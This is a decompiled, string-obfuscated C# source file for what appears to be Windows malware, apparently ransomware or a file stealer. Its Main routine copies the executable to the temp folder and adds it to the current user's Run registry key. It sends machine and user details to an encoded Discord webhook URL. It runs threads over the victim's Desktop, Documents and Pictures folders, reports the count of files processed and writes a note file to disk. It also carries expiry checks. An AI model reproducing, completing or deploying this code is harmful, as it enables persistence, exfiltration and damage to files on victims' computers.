using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class4
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class5
	{
		public static readonly Class5 class5_0;

		public static ThreadStart threadStart_0;

		public static ThreadStart threadStart_1;

		public static ThreadStart threadStart_2;

		public static ThreadStart threadStart_3;

		public static ThreadStart threadStart_4;

		public static ThreadStart threadStart_5;

		static Class5()
		{
			if (DateTime.Now > new DateTime(637618728382804022L))
			{
				throw new Exception();
			}
			class5_0 = new Class5();
		}

		internal void method_0()
		{
			Class0.smethod_0(string_1);
		}

		internal void method_1()
		{
			Class0.smethod_0(string_2);
		}

		internal void method_2()
		{
			Class0.smethod_0(string_0);
		}

		internal void method_3()
		{
			Class0.smethod_1(string_1);
		}

		internal void method_4()
		{
			Class0.smethod_1(string_2);
		}

		internal void method_5()
		{
			Class0.smethod_1(string_0);
		}
	}

	private static string string_0;

	private static string string_1;

	private static string string_2;

	public static string string_3;

	public static string string_4;

	private static Class2 class2_0;

	private static Class9 class9_0;

	private static void Main(string[] args)
	{
		if (DateTime.Now > new DateTime(637618980382214016L))
		{
			throw new Exception();
		}
		if (smethod_6())
		{
			Application.Run((Form)(object)new GForm0());
			return;
		}
		smethod_5();
		smethod_3();
		smethod_0();
		smethod_1();
		smethod_7();
		Thread.Sleep(6000);
		Application.Run((Form)(object)new GForm0());
	}

	private static void smethod_0()
	{
		class2_0.method_1(Class11.smethod_0("\uf26e\uf258\uf249\uf248\uf24d\uf21d\uf24e\uf249\uf25c\uf24f\uf249", 61992));
		List<string> list = Class1.smethod_1();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + Class11.smethod_0("\ue36f", 58117);
		}
		Console.WriteLine(text);
		List<string> list2 = Class6.smethod_1();
		string text2 = Class6.smethod_0();
		string text3 = Class6.smethod_2();
		Class9 @class = new Class9(string_3);
		@class.method_0(string.Format(Class11.smethod_0("\uf851\uf851\uf82b\uf809\uf814\uf81c\uf809\uf81a\uf816\uf85b\uf81e\uf803\uf81e\uf818\uf80e\uf80f\uf81e\uf81f\uf851\uf851\uf85b\uf81b\uf81b\uf81b\uf828\uf80f\uf81a\uf80f\uf80e\uf808\uf841\uf85b\uf83a\uf818\uf80f\uf812\uf80d\uf81e\uf85b\uf871\uf82b\uf838\uf85b\uf835\uf81a\uf816\uf81e\uf841\uf85b\uf800\uf84b\uf806\uf871\uf82e\uf808\uf81e\uf809\uf841\uf800\uf84a\uf806\uf871\uf82e\uf82e\uf832\uf83f\uf841\uf85b\uf800\uf849\uf806\uf871\uf832\uf82b\uf85b\uf83a\uf81f\uf81f\uf809\uf81e\uf808\uf808\uf841\uf85b\uf800\uf848\uf806\uf81b\uf81b\uf81b", 63546), list2[0], list2[1], text2, text3));
		@class.method_0(string.Format(Class11.smethod_0("\uf65b\uf65b\uf65b\uf67f\uf65e\uf658\uf649\uf642\uf64b\uf64f\uf652\uf654\uf655\uf61b\uf670\uf65e\uf642\uf601\uf61b\uf640\uf60b\uf646\uf65b\uf65b\uf65b", 63019), string_4));
		@class.method_0(string.Format(Class11.smethod_0("\ueb0b\ueb0b\ueb0b\ueb3f\ueb04\ueb00\ueb0e\ueb05\ueb18\ueb51\ueb61\ueb10\ueb5b\ueb16\ueb0b\ueb0b\ueb0b", 60266), text));
	}

	public static void smethod_1()
	{
		class9_0.method_0(Class11.smethod_0("\uf293\uf293\uf293\uf2a0\uf287\uf292\uf281\uf287\uf29a\uf29d\uf294\uf2d3\uf295\uf29a\uf29f\uf296\uf2d3\uf296\uf29d\uf290\uf281\uf28a\uf283\uf287\uf29a\uf29c\uf29d\uf2dd\uf2dd\uf293\uf293\uf293", 62065));
		Thread thread = new Thread((ThreadStart)delegate
		{
			Class0.smethod_0(string_1);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Class0.smethod_0(string_2);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Class0.smethod_0(string_0);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		class9_0.method_0(string.Format(Class11.smethod_0("\ue9f6\ue9f6\ue9f6\ue9d0\ue9ff\ue9f8\ue9ff\ue9e5\ue9fe\ue9f3\ue9f2\ue9b6\ue9f3\ue9f8\ue9f5\ue9e4\ue9ef\ue9e6\ue9e2\ue9ff\ue9f8\ue9f1\ue9b6\ue9e0\ue9ff\ue9f5\ue9e2\ue9ff\ue9fb\ue9b1\ue9e5\ue9b6\ue9f0\ue9ff\ue9fa\ue9f3\ue9e5\ue9b8\ue9b6\ue9c2\ue9f9\ue9e2\ue9f7\ue9fa\ue9b6\ue9f8\ue9e3\ue9fb\ue9f4\ue9f3\ue9e4\ue9b6\ue9f9\ue9f0\ue9b6\ue9f0\ue9ff\ue9fa\ue9f3\ue9e5\ue9b6\ue9f3\ue9f8\ue9f5\ue9e4\ue9ef\ue9e6\ue9e2\ue9f3\ue9f2\ue9ac\ue9b6\ue9ed\ue9a6\ue9eb\ue9f6\ue9f6\ue9f6", 59796), Class0.list_0.Count));
		Class8.smethod_0();
	}

	public static void smethod_2()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Class0.smethod_1(string_1);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Class0.smethod_1(string_2);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Class0.smethod_1(string_0);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	private static void smethod_3()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + Class11.smethod_0("\ue591\ue5da\ue5c7\ue5da", 58809);
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class11.smethod_0("\ue5f8\ue5e4\ue5ed\ue5ff\ue5fc\ue5ea\ue5f9\ue5ee\ue5f7\ue5e6\ue5c2\ue5c8\ue5d9\ue5c4\ue5d8\ue5c4\ue5cd\ue5df\ue5f7\ue5fc\ue5c2\ue5c5\ue5cf\ue5c4\ue5dc\ue5d8\ue5f7\ue5e8\ue5de\ue5d9\ue5d9\ue5ce\ue5c5\ue5df\ue5fd\ue5ce\ue5d9\ue5d8\ue5c2\ue5c4\ue5c5\ue5f7\ue5f9\ue5de\ue5c5", 58787), writable: true);
			registryKey.SetValue(Class11.smethod_0("\ue7b1\ue7ad", 59369), Class11.smethod_0("\ue35f", 58232) + text2 + Class11.smethod_0("\ue35f", 58232));
		}
		catch (Exception ex)
		{
			class2_0.method_4(ex.Message);
		}
	}

	public static void smethod_4()
	{
		if (Registry.GetValue(Class11.smethod_0("\ueb3d\ueb3e\ueb30\ueb2c\ueb2a\ueb36\ueb20\ueb27\ueb27\ueb30\ueb3b\ueb21\ueb2a\ueb20\ueb26\ueb30\ueb27\ueb29\ueb26\ueb3a\ueb33\ueb21\ueb22\ueb34\ueb27\ueb30\ueb29\ueb38\ueb1c\ueb16\ueb07\ueb1a\ueb06\ueb1a\ueb13\ueb01\ueb29\ueb22\ueb1c\ueb1b\ueb11\ueb1a\ueb02\ueb06\ueb29\ueb36\ueb00\ueb07\ueb07\ueb10\ueb1b\ueb01\ueb23\ueb10\ueb07\ueb06\ueb1c\ueb1a\ueb1b\ueb29\ueb27\ueb00\ueb1b\ueb29", 60277), Class11.smethod_0("\ue7b1\ue7ad", 59369), true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class11.smethod_0("\ue5f8\ue5e4\ue5ed\ue5ff\ue5fc\ue5ea\ue5f9\ue5ee\ue5f7\ue5e6\ue5c2\ue5c8\ue5d9\ue5c4\ue5d8\ue5c4\ue5cd\ue5df\ue5f7\ue5fc\ue5c2\ue5c5\ue5cf\ue5c4\ue5dc\ue5d8\ue5f7\ue5e8\ue5de\ue5d9\ue5d9\ue5ce\ue5c5\ue5df\ue5fd\ue5ce\ue5d9\ue5d8\ue5c2\ue5c4\ue5c5\ue5f7\ue5f9\ue5de\ue5c5", 58787), writable: true))
			{
				registryKey.DeleteValue(Class11.smethod_0("\ue7b1\ue7ad", 59369), throwOnMissingValue: false);
			}
		}
	}

	private static void smethod_5()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + Class11.smethod_0("\ue591\ue5da\ue5c7\ue5da", 58809);
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception ex)
		{
			class2_0.method_1(ex.Message);
		}
	}

	private static bool smethod_6()
	{
		if (Registry.GetValue(Class11.smethod_0("\ueb3d\ueb3e\ueb30\ueb2c\ueb2a\ueb36\ueb20\ueb27\ueb27\ueb30\ueb3b\ueb21\ueb2a\ueb20\ueb26\ueb30\ueb27\ueb29\ueb26\ueb3a\ueb33\ueb21\ueb22\ueb34\ueb27\ueb30\ueb29\ueb38\ueb1c\ueb16\ueb07\ueb1a\ueb06\ueb1a\ueb13\ueb01\ueb29\ueb22\ueb1c\ueb1b\ueb11\ueb1a\ueb02\ueb06\ueb29\ueb36\ueb00\ueb07\ueb07\ueb10\ueb1b\ueb01\ueb23\ueb10\ueb07\ueb06\ueb1c\ueb1a\ueb1b\ueb29\ueb27\ueb00\ueb1b\ueb29", 60277), Class11.smethod_0("\ue7b1\ue7ad", 59369), null) != null)
		{
			return true;
		}
		return false;
	}

	private static void smethod_7()
	{
		string text = Path.GetTempPath() + Class11.smethod_0("\ue6b1\ue6ad\ue6a0\ue69b\ue69a\ue69c\ue68d\ue686\ue68f\ue68b\ue6d1\ue68b\ue687\ue68b", 59119);
		Console.WriteLine(text);
		using StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine(string_4);
	}

	static Class4()
	{
		if (DateTime.Now > new DateTime(637618728382784028L))
		{
			throw new Exception();
		}
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string_1 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string_3 = Class11.smethod_0("\ueb53\ueb4f\ueb4f\ueb4b\ueb48\ueb01\ueb14\ueb14\ueb5f\ueb52\ueb48\ueb58\ueb54\ueb49\ueb5f\ueb15\ueb58\ueb54\ueb56\ueb14\ueb5a\ueb4b\ueb52\ueb14\ueb4c\ueb5e\ueb59\ueb53\ueb54\ueb54\ueb50\ueb48\ueb14\ueb03\ueb0e\ueb03\ueb0e\ueb08\ueb0d\ueb09\ueb0e\ueb03\ueb09\ueb0a\ueb08\ueb08\ueb03\ueb0b\ueb0a\ueb02\ueb0c\ueb14\ueb16\ueb62\ueb4e\ueb73\ueb0f\ueb4c\ueb51\ueb4a\ueb0b\ueb76\ueb55\ueb71\ueb7c\ueb50\ueb09\ueb53\ueb56\ueb0d\ueb79\ueb57\ueb4a\ueb53\ueb68\ueb72\ueb68\ueb02\ueb43\ueb49\ueb4f\ueb50\ueb43\ueb4b\ueb5f\ueb6f\ueb72\ueb5d\ueb0e\ueb6a\ueb6e\ueb5f\ueb7e\ueb62\ueb03\ueb7e\ueb08\ueb69\ueb52\ueb71\ueb7a\ueb54\ueb53\ueb6e\ueb79\ueb52\ueb78\ueb6f\ueb61\ueb79\ueb62\ueb55\ueb63\ueb5f\ueb61\ueb5c\ueb5d\ueb6e\ueb5a\ueb59", 60211);
		string_4 = Class11.smethod_0("\uf601\uf61c\uf60d\uf636\uf602\uf603\uf60d\uf628\uf63f\uf613\uf619\uf633\uf638\uf668\uf615\uf668\uf639\uf668\uf611\uf630\uf621\uf63f\uf621\uf66e\uf629\uf66f\uf63c\uf662\uf663\uf662\uf633", 63002);
		class2_0 = new Class2(Class11.smethod_0("\uef99\uef98\uef9f\uef88\uef9a", 61340), 0);
		class9_0 = new Class9(string_3);
	}
}
